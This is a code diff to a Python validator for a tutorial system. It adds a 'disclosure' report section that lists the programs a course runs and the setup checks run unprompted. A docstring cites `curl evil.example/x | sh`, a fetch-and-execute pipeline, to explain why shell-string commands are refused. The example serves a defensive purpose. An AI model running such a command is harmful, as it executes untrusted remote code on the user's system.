@@ -525,6 +525,24 @@ LIMITATIONS = """What a pass does and does not mean
       that host's permission layer sees it. That is the only boundary there
       is, and moving execution into a script here would destroy it.
 
+  The `disclosure:` section:
+    it is NOT A CHECK. It produces no finding and no warning, it takes no
+      check number, and it cannot change the exit code. It is a fact the
+      report carries, like `target:` - the block the runner repeats to the
+      learner at materialization, derived here so its content is fixed.
+    IT IS NOT A SAFETY STATEMENT EITHER. It says which programs this course
+      can run and what the tutor will run unprompted. Nothing has checked
+      any of them, and any reading shaped like "these were approved" is the
+      defect section 2.1 of the design names.
+    it names EVERY `command` validator the manifest declares, whether or not
+      any lesson reaches one, so it can name a program this course never
+      runs. That over-disclosure is deliberate; under-disclosure is the
+      error that cannot be corrected afterwards.
+    a malformed `command`, and a setup entry naming a validator that does
+      not exist, are SKIPPED here rather than guessed at. Checks 8 and 29
+      report those, and a section that is not a check does not re-report
+      them.
+
   Supplies (`supplies:`):
     an ABSENT key and a PRESENT-but-empty one (`supplies:` with nothing
       under it, or `supplies: []`) are both silent and both report "n/a" -
@@ -669,6 +687,29 @@ class Finding:
 
 
 @dataclass
+class Disclosure:
+    """What this course will tell a learner it runs. NOT a check.
+
+    It produces no finding, no warning and takes no check number: it is a
+    fact the report carries beside `target:` and `yaml reader:`, in the same
+    way those two are. `references/state-lifecycle.md` section 3 step 7
+    REPEATS this block to the learner rather than deriving one of its own,
+    which is what makes the content of the block testable here at all -
+    prose in a conversation is not.
+
+    `unreadable` carries the reason nothing could be derived, and is set
+    only when tutorial.yaml did not yield a mapping. It exists because the
+    alternative is worse than silence: "nothing to disclose" over an
+    unusable manifest is a positive claim that is FALSE, and this validator
+    does not make claims it did not check. See derive_disclosure().
+    """
+
+    programs: list[str] = field(default_factory=list)
+    unprompted: list[str] = field(default_factory=list)
+    unreadable: str = ""
+
+
+@dataclass
 class Report:
     mode: str
     target: Path
@@ -694,6 +735,12 @@ class Report:
     # than sharing one table in which most numbers never apply.
     checks: dict[int, str] = field(default_factory=lambda: CHECKS)
     limitations: str = ""
+    # None means "this kind of document has none to derive" - a catalogue is
+    # not a bundle and declares no validators. A bundle or an instance always
+    # carries one, even when it is empty, because a fact that reports itself
+    # only by ABSENCE cannot be told from an older validator that never
+    # emitted it.
+    disclosure: Disclosure | None = None
 
     def add(self, check: int, where: str, message: str) -> None:
         self.findings.append(Finding(check, where, message))
@@ -970,7 +1017,9 @@ def _command_shape_error(command: Any) -> str | None:
     `curl evil.example/x | sh` is through a shell, which turns one declared
     validator into a pipeline the declaration never showed. The banner
     `state-lifecycle.md` section 3 draws names `argv[0]` of every command
-    validator; a string has no argv[0] that can be read without guessing.
+    validator - derive_disclosure() below is what reads it out of the
+    manifest - and a string has no argv[0] that can be read without
+    guessing, which is why one contributes no program there.
 
     It says NOTHING about whether the program is safe to run. No check here
     can, and `docs/superpowers/specs/2026-09-14-validator-trust-and-setup-checks-design.md`
@@ -3338,6 +3387,99 @@ def check_setup_validators(
     report.ran(29, detail)
 
 
+# Disclosure (NOT a check).
+#
+# Section 5.4 of
+# docs/superpowers/specs/2026-09-14-validator-trust-and-setup-checks-design.md.
+#
+# The banner at materialization tells the learner which programs this course
+# runs and what the tutor will run unprompted. Written as an instruction the
+# tutor reasons through - collect every `command` validator, take argv[0],
+# deduplicate, decide which of two parts apply - nothing in this repository
+# could test whether it did that correctly, because the output is prose in a
+# conversation.
+#
+# This script already runs at materialization step 6, immediately before step
+# 7 draws the banner, and already prints a report the tutor reads. It has the
+# manifest parsed in hand. So the derivation lives here and step 7 becomes
+# REPEAT THE BLOCK THE VALIDATOR PRINTED. That does not make the BEHAVIOUR
+# testable - a tutor that ignores a correct block is still beyond reach, and
+# saying otherwise would claim more than is true - it makes the CONTENT
+# testable and shrinks what is left to judgement.
+#
+# IT IS NOT A CHECK. No finding, no warning, no check number, and no
+# influence on the exit code. It is a fact the report carries, like `target:`.
+EM_DASH = "—"
+
+
+def derive_disclosure(manifest: Any) -> Disclosure:
+    """What the banner will say this course runs.
+
+    `programs` - argv[0] of every `kind: command` validator in the map,
+    deduplicated and SORTED. Sorted rather than declaration-order so the line
+    is reproducible across two manifests that differ only in ordering. EVERY
+    command validator, not only the ones a lesson reaches: reachability is
+    computable but computing it would create a second source of truth for the
+    runner's dispatch logic, and the two errors are not symmetric -
+    over-disclosure makes a banner slightly noisy, under-disclosure means a
+    learner consented to something nobody told them about.
+
+    `unprompted` - MANIFEST-SCOPE `setup_validators` only, in declaration
+    order, each as `name - describe`. Lesson-scope entries are announced when
+    their lesson opens; listing every one of them here would restate the
+    course's whole structure on a screen the learner meets before lesson one.
+
+    The two parts are INDEPENDENTLY conditional. A course with command
+    validators and no setup step has only the first; a course whose only
+    setup check is `file-exists` has only the second.
+
+    DERIVATION IS DEFENSIVE. The report prints even when checks have found
+    faults, so a `command` that is not a list of strings, or a setup entry
+    naming a validator that does not exist, is SKIPPED rather than crashed
+    on. Checks 8 and 29 already report those, and this must not re-report
+    them in a section that is not a check.
+
+    The one thing it refuses to do is guess. An unusable manifest yields
+    `unreadable` rather than an empty derivation, because "nothing to
+    disclose" over a file this script could not read is a positive claim
+    about a course nobody examined.
+    """
+    if not isinstance(manifest, dict):
+        return Disclosure(
+            unreadable="tutorial.yaml did not parse into a mapping, so the "
+            "validators map and setup_validators could not be read"
+        )
+
+    validators = manifest.get("validators")
+    validators = validators if isinstance(validators, dict) else {}
+
+    programs: set[str] = set()
+    for vdef in validators.values():
+        if not isinstance(vdef, dict) or vdef.get("kind") != "command":
+            continue
+        command = vdef.get("command")
+        # The same predicate check 8 applies, so there is one answer to
+        # "is this argument list well formed" rather than two that can drift.
+        if _command_shape_error(command) is None:
+            programs.add(command[0])
+
+    unprompted: list[str] = []
+    declared = manifest.get(SETUP_VALIDATORS_KEY)
+    if isinstance(declared, list):
+        for entry in declared:
+            if not isinstance(entry, dict):
+                continue
+            name = entry.get("name")
+            describe = entry.get("describe")
+            if not _is_text(name) or not _is_text(describe):
+                continue
+            if name not in validators:
+                continue
+            unprompted.append(f"{name} {EM_DASH} {describe.strip()}")
+
+    return Disclosure(programs=sorted(programs), unprompted=unprompted)
+
+
 # Bundle relationships (checks 23, 24, 25).
 #
 # Four optional manifest keys let a bundle say what it TEACHES, what it
@@ -4232,6 +4374,15 @@ def validate(target: Path, mode: str) -> Report:
     # generated lesson's own setup_validators entries get every
     # well-formedness check a listed lesson's do.
     check_setup_validators(manifest_dict, all_lessons, report)
+    # Disclosure, and NOT a check: no finding, no warning, no number, no
+    # effect on the exit code. It is derived here rather than by the tutor so
+    # that the banner's content is testable, and it is given the RAW manifest
+    # rather than manifest_dict, because an unusable tutorial.yaml must
+    # report that it could not be read instead of claiming there is nothing
+    # to disclose. Emitted in BOTH modes: the protocol consumes it at
+    # materialization step 6, and an author validating a bundle sees what
+    # their course will tell learners it runs.
+    report.disclosure = derive_disclosure(manifest)
     # Relationship metadata. All three run in BOTH modes: the four keys are
     # copied into the instance with the rest of tutorial.yaml, and a runner
     # reads `assumes` before the first task and the recommendation lists at
@@ -4916,6 +5067,39 @@ def validate_catalog(target: Path, portable: bool) -> Report:
     return report
 
 
+def render_disclosure(disclosure: Disclosure | None, stream) -> None:
+    """The `disclosure:` section, beside `target:` and `yaml reader:`.
+
+    A catalogue passes None and gets no section: it is a different kind of
+    document, with no validators map to derive one from.
+
+    A bundle or an instance ALWAYS gets one, and one that has nothing to
+    disclose says so rather than omitting the section. Silence would be
+    ambiguous - an absent section could mean "this course runs no programs"
+    or "an older validator that does not emit this" - and a fact that
+    reports itself only by absence is the same defect as a check that
+    cannot report a positive.
+    """
+    if disclosure is None:
+        return
+    if disclosure.unreadable:
+        print(f"disclosure:  not derived - {disclosure.unreadable}", file=stream)
+        return
+    if not disclosure.programs and not disclosure.unprompted:
+        print(
+            "disclosure:  nothing to disclose "
+            "(no command validator, no setup_validators)",
+            file=stream,
+        )
+        return
+    print("disclosure:", file=stream)
+    if disclosure.programs:
+        print(f"  programs:    {', '.join(disclosure.programs)}", file=stream)
+    for index, entry in enumerate(disclosure.unprompted):
+        label = "  unprompted: " if index == 0 else " " * 14
+        print(f"{label} {entry}", file=stream)
+
+
 def render(report: Report, stream=sys.stdout) -> None:
     if report.checks is CHECKS:
         applicable = sorted(
@@ -4931,6 +5115,7 @@ def render(report: Report, stream=sys.stdout) -> None:
     print(f"tutorAIl validator - mode: {report.mode}", file=stream)
     print(f"target:      {report.target}", file=stream)
     print(f"yaml reader: {YAML_READER}", file=stream)
+    render_disclosure(report.disclosure, stream)
     print("", file=stream)
     print("checks:", file=stream)
     for number in applicable:
